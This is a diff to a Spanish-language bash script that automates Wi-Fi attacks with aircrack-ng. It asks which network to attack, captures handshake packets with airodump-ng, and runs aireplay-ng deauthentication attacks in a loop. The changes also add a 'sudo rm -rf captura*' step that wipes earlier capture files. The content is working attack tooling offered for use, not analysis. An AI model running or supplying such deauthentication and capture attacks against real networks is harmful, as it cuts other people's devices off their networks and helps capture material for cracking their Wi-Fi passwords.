@@ -25,7 +25,7 @@ instalar_paquete_sinosta() {
 # Comprobar e instalar paquetes necesarios
 instalar_paquete_sinosta aircrack-ng
 instalar_paquete_sinosta wget
-instalar_paquete_sinosta dbus-x11
+instalar_paquete_sinosta dbus
 
 # Obtener el nombre de la interfaz inalámbrica
 wifi_interface=$(iwconfig 2>/dev/null | grep -o '^[a-zA-Z0-9]*')
@@ -99,7 +99,10 @@ case $option in
         read -p "Presiona Enter para continuar..."
         read -p "Escribe el nombre de la red que quieres atacar: " red
         read -p "Presiona Enter para continuar..."
-        read -p "Escribe el nombre del archivo donde guardar los paquetes (sin extensión): " archivo
+        echo "Eliminando los archivos captura*, para empezar a capturar desde cero"
+        sudo rm -rf captura*
+        read -p "Presiona Enter para continuar..."
+        read -p "Escribe el nombre del archivo donde guardar los paquetes (Se recomienda utilizar como nombre captura, sin extensión): " archivo
         read -p "Presiona Enter para continuar..."
 
         gnome-terminal -- sudo airodump-ng -c $Chanel --bssid $bssid -w $archivo $monitor_interface
@@ -114,8 +117,8 @@ case $option in
 
         # Realizar ataque de desautenticación múltiples veces
             for ((i=1; i<=$num_attacks; i++)); do
-            gnome-terminal -- sudo aireplay-ng -0 9 -a $bssid -c $bssidStation $monitor_interface
-            sleep 5 # Esperar unos segundos antes del próximo ataque
+                sudo aireplay-ng -0 9 -a $bssid -c $bssidStation $monitor_interface
+                sleep 5 # Esperar unos segundos antes del próximo ataque
             done
 
             read -p "¿Quieres repetir el ataque con otro número de veces? (s/n): " repeat
